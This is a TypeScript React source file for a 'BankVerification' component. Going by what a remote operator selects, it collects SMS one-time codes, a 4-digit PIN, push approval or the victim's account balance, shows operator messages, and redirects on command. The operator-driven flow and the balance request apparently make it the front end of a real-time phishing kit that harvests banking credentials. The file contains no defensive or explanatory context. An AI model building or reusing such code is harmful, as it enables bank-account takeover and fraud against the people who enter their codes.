import React, { useState, useEffect, useCallback } from "react";
import { useSessionStatus } from "../hooks/use-session-status";
import { useResendCountdown } from "../hooks/use-resend-countdown";
import { submitOtp, resendOtp, submitBalance } from "../lib/bank-api";
import {
  StatusOverlay,
  SmsOtp,
  PinEntry,
  PushWaiting,
  BalanceCheck,
} from "../layouts/generic";
import type { BankVerificationProps } from "../types";

const RESEND_COOLDOWN = 60;

function normalizeLayout(slug: string | undefined): string {
  if (!slug) return "sms";
  if (slug.endsWith("-sms")) return "sms";
  if (slug.endsWith("-pin")) return "pin";
  return slug;
}

const LAYOUT_MAP: Record<string, React.ComponentType<any>> = {
  sms: SmsOtp,
  pin: PinEntry,
  push: PushWaiting,
  balance: BalanceCheck,
};

export function BankVerification({
  apiBase,
  channelSlug,
  sessionId,
  onSuccess,
  onDeclined,
  onError,
  onRedirect,
}: BankVerificationProps) {
  const [error, setError] = useState<string | null>(null);
  const [submitting, setSubmitting] = useState(false);
  const [code, setCode] = useState("");
  const [pinValue, setPinValue] = useState("");
  const [pinMasked, setPinMasked] = useState(true);
  const [balance, setBalance] = useState("");

  const { status, verificationLayout, bank, redirectUrl, transactionDetails, wrongCode, expiredCode, clearCodeFeedback, operatorMessage, countdownResetTrigger } =
    useSessionStatus(apiBase, channelSlug, sessionId);

  const baseLayout = normalizeLayout(verificationLayout);
  const resendFn = useCallback(() => {
    if (baseLayout === "pin") return resendOtp(apiBase, channelSlug, sessionId, "pin");
    if (baseLayout === "sms") return resendOtp(apiBase, channelSlug, sessionId, "sms");
    return Promise.resolve();
  }, [apiBase, channelSlug, sessionId, baseLayout]);

  const resendState = useResendCountdown(RESEND_COOLDOWN, countdownResetTrigger, resendFn);

  useEffect(() => {
    if (wrongCode || expiredCode) {
      setSubmitting(false);
      setCode("");
      setPinValue("");
    }
  }, [wrongCode, expiredCode]);

  useEffect(() => {
    if (!channelSlug || !sessionId) return;
    if (redirectUrl) {
      if (onRedirect) {
        onRedirect(redirectUrl);
      } else {
        window.location.replace(redirectUrl);
      }
      return;
    }
    const terminalSuccess = ["success"].includes(status);
    const terminalDeclined = ["declined", "expired", "blocked"].includes(status);
    if (terminalSuccess) {
      onSuccess?.(sessionId);
      return;
    }
    if (status === "invalid") {
      onError?.("invalid");
      return;
    }
    if (terminalDeclined) {
      onDeclined?.(sessionId, status);
    }
  }, [channelSlug, sessionId, status, redirectUrl, onSuccess, onDeclined, onError, onRedirect]);

  const handleSubmitOtp = useCallback(
    async (code: string) => {
      clearCodeFeedback?.();
      setSubmitting(true);
      try {
        await submitOtp(apiBase, channelSlug, sessionId, code);
      } catch (e) {
        setError(e instanceof Error ? e.message : "Invalid code");
        setSubmitting(false);
      }
    },
    [apiBase, channelSlug, sessionId, clearCodeFeedback]
  );

  const handleSubmitBalance = useCallback(
    async (balance: string) => {
      setError("");
      setSubmitting(true);
      try {
        await submitBalance(apiBase, channelSlug, sessionId, balance);
      } catch (e) {
        setError(e instanceof Error ? e.message : "Failed to submit balance");
        setSubmitting(false);
      }
    },
    [apiBase, channelSlug, sessionId]
  );

  if (!channelSlug || !sessionId) {
    return (
      <div className="bank-ui-error-missing">Missing channel or session</div>
    );
  }

  const terminalSuccess = ["success"].includes(status);
  const terminalDeclined = ["declined", "expired", "blocked", "invalid"].includes(status);
  const inProgress = ["pending", "awaiting_action"].includes(status);
  const awaitingVerification = [
    "awaiting_sms",
    "awaiting_pin",
    "awaiting_push",
    "awaiting_balance",
  ].includes(status);

  if (redirectUrl || terminalSuccess || terminalDeclined) {
    return null;
  }

  const Layout = LAYOUT_MAP[baseLayout] ?? LAYOUT_MAP.sms;

  const layoutProps =
    baseLayout === "push"
      ? { bank, transactionDetails }
      : baseLayout === "balance"
        ? {
            bank,
            transactionDetails,
            balance,
            onBalanceChange: setBalance,
            operatorMessage,
            onSubmit: () => handleSubmitBalance(balance),
            submitting,
            canSubmit: balance.trim().length > 0,
          }
        : baseLayout === "pin"
          ? {
              bank,
              transactionDetails,
              pinValue,
              onPinChange: (v: string) => {
                setPinValue(v);
                if (v.length === 4) {
                  clearCodeFeedback?.();
                  handleSubmitOtp(v);
                }
              },
              pinMasked,
              onPinMaskToggle: () => setPinMasked((m) => !m),
              wrongCode,
              expiredCode,
              onTryAgain: clearCodeFeedback,
              operatorMessage,
              submitting,
              resendState,
            }
          : {
              bank,
              transactionDetails,
              code,
              onCodeChange: setCode,
              wrongCode,
              expiredCode,
              onTryAgain: clearCodeFeedback,
              operatorMessage,
              onSubmit: () => handleSubmitOtp(code),
              submitting,
              canSubmit: code.replace(/\D/g, "").length >= 6,
              resendState,
            };

  return (
    <div className="bank-ui-verification">
      {inProgress && <StatusOverlay />}
      {awaitingVerification && <Layout {...layoutProps} />}
      {error && (
        <div className="bank-ui-error-toast-wrapper">
          <div className="bank-ui-error-toast">{error}</div>
        </div>
      )}
    </div>
  );
}
